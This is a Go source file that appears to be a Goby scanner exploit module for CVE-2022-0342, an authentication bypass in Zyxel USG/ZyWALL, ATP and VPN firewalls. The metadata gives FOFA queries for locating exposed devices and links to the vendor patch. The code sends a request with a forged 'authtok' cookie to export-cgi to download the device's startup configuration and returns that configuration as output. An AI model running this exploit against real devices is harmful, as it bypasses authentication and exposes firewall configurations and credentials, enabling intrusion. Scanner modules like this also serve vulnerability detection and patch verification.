package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zyxel Authentication Bypass Vulnerability (CVE-2022-0342)",
    "Description": "<p>Zyxel USG/ZyWALL is a firewall of China Zyxel Technology (Zyxel).</p><p>Zyxel USG/ZyWALL 4.20 to 4.70, USG FLEX 4.50 to 5.20, ATP 4.32 to 5.20, VPN 4.30 to 5.20, NSG 1.20 to 1.33 Patch 4 have security vulnerabilities, which can be exploited by attackers to circumvent Authenticate over the web and gain administrative access to the device.</p>",
    "Product": "Zyxel-USG-ZyWALL",
    "Homepage": "https://www.zyxel.com/",
    "DisclosureDate": "2022-03-28",
    "Author": "sharecast",
    "FofaQuery": "(body=\"/2FA-access.cgi\" && body=\"zyxel zyxel_style1\")|| (title=\"ZyWall\" && title!=\"ZyWALL Security\" && title!=\"Zyxel shop\") || title=\"USG FLEX\" ",
    "GobyQuery": "(body=\"/2FA-access.cgi\" && body=\"zyxel zyxel_style1\")|| (title=\"ZyWall\" && title!=\"ZyWALL Security\" && title!=\"Zyxel shop\") || title=\"USG FLEX\" ",
    "Level": "3",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:  <a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml</a></p>",
    "References": [
        "https://security.humanativaspa.it/zyxel-authentication-bypass-patch-analysis-cve-2022-0342/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Disposition: attachment;",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "firmware",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-0342"
    ],
    "CNNVD": [
        "CNNVD-202203-2311"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Zyxel 认证绕过漏洞（CVE-2022-0342）",
            "Product": "Zyxel-USG-ZyWALL",
            "Description": "<p>Zyxel USG/ZyWALL是中国合勤科技（Zyxel）公司的一款防火墙。</p><p>Zyxel USG/ZyWALL 4.20版本至4.70版本、USG FLEX 4.50版本至5.20版本、ATP 4.32版本至5.20版本、VPN 4.30版本至5.20版本、NSG 1.20版本至1.33 Patch 4版本存在安全漏洞，攻击者利用该漏洞绕过Web身份验证并获得设备的管理访问权限。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接： <a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml</a><br></p>",
            "Impact": "<p>攻击者利用该漏洞绕过Web身份验证并获得设备的管理访问权限，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Zyxel Authentication Bypass Vulnerability (CVE-2022-0342)",
            "Product": "Zyxel-USG-ZyWALL",
            "Description": "<p>Zyxel USG/ZyWALL is a firewall of China Zyxel Technology (Zyxel).</p><p>Zyxel USG/ZyWALL 4.20 to 4.70, USG FLEX 4.50 to 5.20, ATP 4.32 to 5.20, VPN 4.30 to 5.20, NSG 1.20 to 1.33 Patch 4 have security vulnerabilities, which can be exploited by attackers to circumvent Authenticate over the web and gain administrative access to the device.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:&nbsp; <a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml</a><br><br></p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br><br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-06",
    "PocId": "10695"
}`

	sendGetPayloadGRYFFhcnh := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/cgi-bin/export-cgi?category=config&arg0=startup-config.conf")
		getRequestConfig.Header.Store("Cookie", "authtok=AAAAAAA; secuRtBannerClsCookie=login")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendGetPayloadGRYFFhcnh(hostinfo)
			return err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "firmware version") && strings.Contains(resp.HeaderString.String(), "Content-Disposition: attachment; ")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "config" {
				resp, err := sendGetPayloadGRYFFhcnh(expResult.HostInfo)
				if err != nil || resp == nil || (resp != nil && resp.StatusCode != 200) || !strings.Contains(resp.Utf8Html, "firmware version") || !strings.Contains(resp.HeaderString.String(), "Content-Disposition: attachment; ") {
					return expResult
				}
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
